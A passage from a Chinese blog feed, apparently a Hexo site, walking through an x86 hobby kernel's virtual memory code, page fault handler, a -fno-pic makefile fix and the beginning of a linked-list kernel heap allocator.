class="comment">// 不映射第 0 页，便于跟踪 NULL 指针</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; PTE_COUNT * PTE_SIZE; i++) &#123;</span><br><span class="line">		pte[i] = (i &lt;&lt; <span class="number">12</span>) | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> pgd_kern_phy_addr = (<span class="type">uint32_t</span>)pgd_kern - PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 注册页错误中断的处理函数 ( 14 是页故障的中断号 )</span></span><br><span class="line">	register_interrupt_handler(<span class="number">14</span>, &amp;page_fault);</span><br><span class="line"></span><br><span class="line">	switch_pgd(pgd_kern_phy_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">switch_pgd</span><span class="params">(<span class="type">uint32_t</span> pd)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %0, %%cr3&quot;</span> : : <span class="string">&quot;r&quot;</span> (pd))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">map</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va, <span class="type">uint32_t</span> pa, <span class="type">uint32_t</span> flags)</span></span><br><span class="line">&#123; 	</span><br><span class="line">	<span class="type">uint32_t</span> pgd_idx = PGD_INDEX(va);</span><br><span class="line">	<span class="type">uint32_t</span> pte_idx = PTE_INDEX(va); </span><br><span class="line">	</span><br><span class="line">	<span class="type">pte_t</span> *pte = (<span class="type">pte_t</span> *)(pgd_now[pgd_idx] &amp; PAGE_MASK);</span><br><span class="line">	<span class="keyword">if</span> (!pte) &#123;</span><br><span class="line">		pte = (<span class="type">pte_t</span> *)pmm_alloc_page();</span><br><span class="line">		pgd_now[pgd_idx] = (<span class="type">uint32_t</span>)pte | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 转换到内核线性地址并清 0</span></span><br><span class="line">		pte = (<span class="type">pte_t</span> *)((<span class="type">uint32_t</span>)pte + PAGE_OFFSET);</span><br><span class="line">		bzero(pte, PAGE_SIZE);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 转换到内核线性地址</span></span><br><span class="line">		pte = (<span class="type">pte_t</span> *)((<span class="type">uint32_t</span>)pte + PAGE_OFFSET);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pte[pte_idx] = (pa &amp; PAGE_MASK) | flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通知 CPU 更新页表缓存</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;invlpg (%0)&quot;</span> : : <span class="string">&quot;a&quot;</span> (va))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unmap</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> pgd_idx = PGD_INDEX(va);</span><br><span class="line">	<span class="type">uint32_t</span> pte_idx = PTE_INDEX(va);</span><br><span class="line"></span><br><span class="line">	<span class="type">pte_t</span> *pte = (<span class="type">pte_t</span> *)(pgd_now[pgd_idx] &amp; PAGE_MASK);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pte) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 转换到内核线性地址</span></span><br><span class="line">	pte = (<span class="type">pte_t</span> *)((<span class="type">uint32_t</span>)pte + PAGE_OFFSET);</span><br><span class="line"></span><br><span class="line">	pte[pte_idx] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通知 CPU 更新页表缓存</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;invlpg (%0)&quot;</span> : : <span class="string">&quot;a&quot;</span> (va))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">get_mapping</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va, <span class="type">uint32_t</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> pgd_idx = PGD_INDEX(va);</span><br><span class="line">	<span class="type">uint32_t</span> pte_idx = PTE_INDEX(va);</span><br><span class="line"></span><br><span class="line">	<span class="type">pte_t</span> *pte = (<span class="type">pte_t</span> *)(pgd_now[pgd_idx] &amp; PAGE_MASK);</span><br><span class="line">	<span class="keyword">if</span> (!pte) &#123;</span><br><span class="line">	      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 转换到内核线性地址</span></span><br><span class="line">	pte = (<span class="type">pte_t</span> *)((<span class="type">uint32_t</span>)pte + PAGE_OFFSET);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果地址有效而且指针不为NULL，则返回地址</span></span><br><span class="line">	<span class="keyword">if</span> (pte[pte_idx] != <span class="number">0</span> &amp;&amp; pa) &#123;</span><br><span class="line">		 *pa = pte[pte_idx] &amp; PAGE_MASK;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__attribute__ ((aligned(PAGE_SIZE)))</code> 是GCC的扩展指令，功能是使得变量的起始地址按照某个数值 对齐，所以我们轻轻松松的就解决了这个难题。</p>
<blockquote>
<p>include&#x2F;vmm.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_VMM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_VMM_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核的偏移地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_OFFSET 0xC0000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">12 * P−− 位 0 是存在 (Present) 标志，用于指明表项对地址转换是否有效。</span></span><br><span class="line"><span class="comment">13 * P = 1 表示有效； P = 0 表示无效。</span></span><br><span class="line"><span class="comment">14 * 在页转换过程中，如果说涉及的页目录或页表的表项无效，则会导致一个异常。</span></span><br><span class="line"><span class="comment">15 * 如果 P = 0 ，那么除表示表项无效外，其余位可供程序自由使用。</span></span><br><span class="line"><span class="comment">16 * 例如，操作系统可以使用这些位来保存已存储在磁盘上的页面的序号。</span></span><br><span class="line"><span class="comment">17 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_PRESENT 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">21 * R/W −− 位 1 是读 / 写 (Read/Write) 标志。如果等于 1 ，表示页面可以被读、写或执行。</span></span><br><span class="line"><span class="comment">22 * 如果为 0 ，表示页面只读或可执行。</span></span><br><span class="line"><span class="comment">23 * 当处理器运行在超级用户特权级（级别 0,1 或） 2 时，则 R/W 位不起作用。</span></span><br><span class="line"><span class="comment">24 * 页目录项中的 R/W 位对其所映射的所有页面起作用。</span></span><br><span class="line"><span class="comment">25 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_WRITE 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">29 * U/S −− 位 2 是用户 / 超级用户 (User/Supervisor) 标志。</span></span><br><span class="line"><span class="comment">30 * 如果为 1 ，那么运行在任何特权级上的程序都可以访问该页面。</span></span><br><span class="line"><span class="comment">31 * 如果为 0 ，那么页面只能被运行在超级用户特权级 (0,1 或 2) 上的程序访问。</span></span><br><span class="line"><span class="comment">32 * 页目录项中的 U/S 位对其所映射的所有页面起作用。</span></span><br><span class="line"><span class="comment">33 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_USER 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 虚拟分页的大学 4KB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页掩犸</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MASK 0xFFFFF000</span></span><br><span class="line"><span class="comment">// 获取一个地址的页目录项 右移动22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_INDEX(x) (((x) &gt;&gt; 22) &amp; 0x3FF)</span></span><br><span class="line"><span class="comment">// 获取一个地址的页目录项</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_INDEX(x) (((x) &gt;&gt; 22) &amp; 0x3FF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个地址的页表项</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_INDEX(x) (((x) &gt;&gt; 12) &amp; 0x3FF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个地址的页內偏移</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET_INDEX(x) ((x) &amp; 0xFFF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页目录数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> <span class="type">pgd_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页表数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> <span class="type">pte_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页表成员数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_SIZE (PAGE_SIZE/sizeof(pte_t))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页表成员数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_SIZE (PAGE_SIZE/sizeof(uint32_t))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 映射 512MB 内存所需要的页表数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_COUNT 128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核页目录区域</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">pgd_t</span> pgd_kern[PGD_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化虚拟内存管理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_vmm</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更换当前的页目录</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">switch_pgd</span><span class="params">(<span class="type">uint32_t</span> pd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 flags 指出的页权限，把物理地址 pa 映射到虚拟地址 va</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va, <span class="type">uint32_t</span> pa, <span class="type">uint32_t</span> flags)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取消虚拟地址 va 的物理映射</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unmap</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果虚拟地址 va 映射到物理地址则返回 1</span></span><br><span class="line"><span class="comment">// 同时如果 pa 不是空指针则把物理地址写入 pa 参数</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">get_mapping</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va, <span class="type">uint32_t</span> *pa)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页错误中断的函数处理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_fault</span><span class="params">(pt_regs *regs)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// INCLUDE</span></span></span><br></pre></td></tr></table></figure>



<p>**当cpu 进入分页模式，一旦发生内存访问的页错误，就会产生14号中断 **</p>
<blockquote>
<p>mm&#x2F;page_fault.c 14号中断处理函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_fault</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> cr2;</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %%cr2, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (cr2))</span>;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;Page fault at 0x%x, virtual faulting address 0x%x\n&quot;</span>, regs-&gt;eip, cr2);</span><br><span class="line">	printk(<span class="string">&quot;Error code: %x\n&quot;</span>, regs-&gt;err_code);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// bit 0 为 0 指页面不存在内存里</span></span><br><span class="line">	<span class="keyword">if</span> ( !(regs-&gt;err_code &amp; <span class="number">0x1</span>)) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;Because the page wasn&#x27;t present.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bit 1 为 0 表示读错误，为 1 为写错误</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;err_code &amp; <span class="number">0x2</span>) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;Write error.\n&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;Read error.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bit 2 为 1 表示在用户模式打断的，为 0 是在内核模式打断的</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;err_code &amp; <span class="number">0x4</span>) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;In user mode.\n&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;In kernel mode.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bit 3 为 1 表示错误是由保留位覆盖造成的</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;err_code &amp; <span class="number">0x8</span>) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;Reserved bits being overwritten.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bit 4 为 1 表示错误发生在取指令的时候</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;err_code &amp; <span class="number">0x10</span>) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;The fault occurred during an instruction fetch.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>objdump - h hx…</p>
</blockquote>
<p><img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240515153030548.png" alt="image-20240515153030548"></p>
<p>得到这个 </p>
<p><img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240515152938282.png" alt="image-20240515152938282"></p>
<blockquote>
<p>显然结果不太对劲 —</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">C_FLAGS = -c -Wall -m32 -ggdb -gstabs+ -nostdinc -fno-builtin -fno-stack-protector -I <span class="keyword">include</span></span><br><span class="line"><span class="comment">#将makefile 修改如下  即添加-fno-pic</span></span><br><span class="line">C_FLAGS = -c -Wall -m32 -ggdb -gstabs+ -nostdinc -fno-pic -fno-builtin -fno-stack-protector -I <span class="keyword">include</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240520221554124.png" alt="image-20240520221554124"></p>
<h3 id="非位置无关代码"><a href="#非位置无关代码" class="headerlink" title="非位置无关代码"></a>非位置无关代码</h3><blockquote>
<p><code>-fno-pic</code></p>
<p><a href="https://blog.csdn.net/tilblackout/article/details/135585340">位置无关码PIC详解：原理、动态链接库、代码重定位_-pic 位置无关代码-CSDN博客</a></p>
</blockquote>
<ul>
<li><code>-fno-pic</code> 是 GCC 编译器的一个编译选项，用于生成<strong>非位置无关代码</strong>（Non-Position Independent Code, 非PIC）</li>
</ul>
<p><strong>位置无关代码：</strong></p>
<p>位置无关代码是一种在加载时可以<strong>不依赖于固定的内存地址而运行的代码</strong>。PIC 通常用于共享库（shared libraries），因为它允许相同的代码在不同的进程地址空间中加载到不同的地址。</p>
<ul>
<li>编译时生成的代码可以在内存中的任何位置运行。</li>
<li>通常使用相对地址进行跳转和数据访问。</li>
</ul>
<p><strong>非位置无关代码：</strong></p>
<ul>
<li><p>编译时生成的代码预期在特定的内存地址运行。</p>
</li>
<li><p>使用绝对地址进行跳转和数据访问。</p>
</li>
<li><p><strong>操作系统内核通常加载在固定的物理地址或虚拟地址空间中，因此不需要位置无关的特性。</strong></p>
</li>
<li><p>内核代码必须能够直接访问硬件和内存，这需要使用绝对地址。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-7-heap</title>
    <url>/2024/05/20/x86-7-heap/</url>
    <content><![CDATA[<h1 id="11-内核堆管理的实现"><a href="#11-内核堆管理的实现" class="headerlink" title="11.内核堆管理的实现"></a>11.内核堆管理的实现</h1><p>目前已经实现了页管理，但是在需要分配小内存的时候，比较容易造成<strong>内部碎片</strong>， — 实现内核的堆管理算法</p>
<p>内部碎片指的是：内存中各种对齐规则的限制，导致分配的内存 大于 进程所需要的内存，因此会造成内部碎片</p>
<p><strong>需要实现的功能：</strong></p>
<ul>
<li>分配内存</li>
<li>在内存释放的时候对连续的内存进行合并</li>
<li>在空闲内存过多的时候，将物理页释放给物理内存管理模块</li>
</ul>
<blockquote>
<p>关于堆的实现，选择最简单的<strong>侵入式链表管理方法</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/675389928">Linux: C语言实现范型数据结构 - 嵌入(侵入)式链表浅谈 - 知乎 (zhihu.com)</a></p>
<p>侵入式链表（Intrusive Linked List）是一种链表实现方式，其中<strong>链表节点的链接信息嵌入在节点数据结构本身中。</strong></p>
<p>减少了内存的开销</p>
</blockquote>
<blockquote>
<p>include&#x2F;heap.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_HEAP_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_HEAR_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆起始地址，它是内核页表没有使用的空闲区域。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_START 0xE0000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存块管理结构</span></span><br><span class="line"><span class="keyword">typedef</span> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">header</span> *<span class="title">prev</span>;</span>   <span class="comment">// 前后内存快管理结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">header</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> allocated : <span class="number">1</span>;  <span class="comment">// 该块内存是否已经被申请</span></span><br><span class="line">    <span class="type">uint32_t</span> length : <span class="number">31</span>;    <span class="comment">// 当前内存块的长度</span></span><br><span class="line">&#125;<span class="type">header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化堆</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_heap</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存申请</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存释放</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_heap</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> allocated : <span class="number">1</span>;  <span class="comment">// 该块内存是否已经被申请</span></span><br><span class="line">   <span class="type">uint32_t</span> length : <span class="number">31</span>; </span><br></pre></td></tr></table></figure>

<p>C语言的位域，能够节省内存，允许精确控制每个成员的位宽，但是移植性较差</p>
<blockquote>
<p>mm&#x2F;heap.c 具体实现  除了上述的外部接口函数，还需要实现一些内部函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存块</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">alloc_chunk</span><span class="params">(<span class="type">uint32_t</span> start, <span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放内存块</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">free_chunk</span><span class="params">(<span class="type">header_t</span> *chunk)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切分内存块</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">split_chunk</span><span class="params">(<span class="type">header_t</span> *chunk, <span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">glue_chunk</span><span class="params">(<span class="type">header_t</span> *chunk)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> heap_max = HEAP_START;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存块管理头指针</span></span><br><span class="line"><span class="type">static</span> <span class="type">header_t</span> *heap_first;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_heap</span><span class="params">()</span> &#123;</span><br><span class="line">    heap_first = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">uint32_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 所有申请的内存长度加上管理头的长度</span></span><br><span class="line">	<span class="comment">// 因为在内存申请和释放的时候要通过该结构去管理</span></span><br><span class="line">	len += <span class="keyword">sizeof</span>(<span class="type">header_t</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">header_t</span> *cur_header = heap_first;</span><br><span class="line">	<span class="type">header_t</span> *prev_header = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (cur_header) &#123;</span><br><span class="line">		<span class="comment">// 如果当前内存块没有被申请过而且长度大于待申请的块</span></span><br><span class="line">		<span class="keyword">if</span> (cur_header-&gt;allocated == <span class="number">0</span> &amp;&amp; cur_header-&gt;length &gt;= len) &#123;</span><br><span class="line">			<span class="comment">// 按照当前长度切割内存</span></span><br><span class="line">			split_chunk(cur_header, len);</span><br><span class="line">			cur_header-&gt;allocated = <span class="number">1</span>;</span><br><span class="line">			<span class="comment">// 返回的时候必须将指针挪到管理结构之后</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">uint32_t</span>)cur_header + <span class="keyword">sizeof</span>(<span class="type">header_t</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 逐次推移指针</span></span><br><span class="line">		prev_header = cur_header;</span><br><span class="line">		cur_header = cur_header-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> chunk_start;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 第一次执行该函数则初始化内存块起始位置</span></span><br><span class="line">	<span class="comment">// 之后根据当前指针加上申请的长度即可</span></span><br><span class="line">	<span class="keyword">if</span> (prev_header) &#123;</span><br><span class="line">		chunk_start = (<span class="type">uint32_t</span>)prev_header + prev_header-&gt;length;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		chunk_start = HEAP_START;</span><br><span class="line">		heap_first = (<span class="type">header_t</span> *)chunk_start;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查是否需要申请内存页</span></span><br><span class="line">	alloc_chunk(chunk_start, len);</span><br><span class="line">	cur_header = (<span class="type">header_t</span> *)chunk_start;</span><br><span class="line">	cur_header-&gt;prev = prev_header;</span><br><span class="line">	cur_header-&gt;next = <span class="number">0</span>;</span><br><span class="line">	cur_header-&gt;allocated = <span class="number">1</span>;</span><br><span class="line">	cur_header-&gt;length = len;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (prev_header) &#123;</span><br><span class="line">		prev_header-&gt;next = cur_header;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">void</span>*)(chunk_start + <span class="keyword">sizeof</span>(<span class="type">header_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 指针回退到管理结构，并将已使用标记置 0</span></span><br><span class="line">	<span class="type">header_t</span> *header = (<span class="type">header_t</span>*)((<span class="type">uint32_t</span>)p - <span class="keyword">sizeof</span>(<span class="type">header_t</span>));</span><br><span class="line">	header-&gt;allocated = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 粘合内存块</span></span><br><span class="line">	glue_chunk(header);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_chunk</span><span class="params">(<span class="type">uint32_t</span> start, <span class="type">uint32_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 如果当前堆的位置已经到达界限则申请内存页</span></span><br><span class="line">	<span class="comment">// 必须循环申请内存页直到有到足够的可用内存</span></span><br><span class="line">	<span class="keyword">while</span> (start + len &gt; heap_max) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> page = pmm_alloc_page();</span><br><span class="line">		<span class="built_in">map</span>(pgd_kern, heap_max, page, PAGE_PRESENT | PAGE_WRITE);</span><br><span class="line">		heap_max += PAGE_SIZE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_chunk</span><span class="params">(<span class="type">header_t</span> *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;prev == <span class="number">0</span>) &#123;</span><br><span class="line">		heap_first = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		chunk-&gt;prev-&gt;next = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 空闲的内存超过 1 页的话就释放掉</span></span><br><span class="line">	<span class="keyword">while</span> ((heap_max - PAGE_SIZE) &gt;= (<span class="type">uint32_t</span>)chunk) &#123;</span><br><span class="line">		heap_max -= PAGE_SIZE;</span><br><span 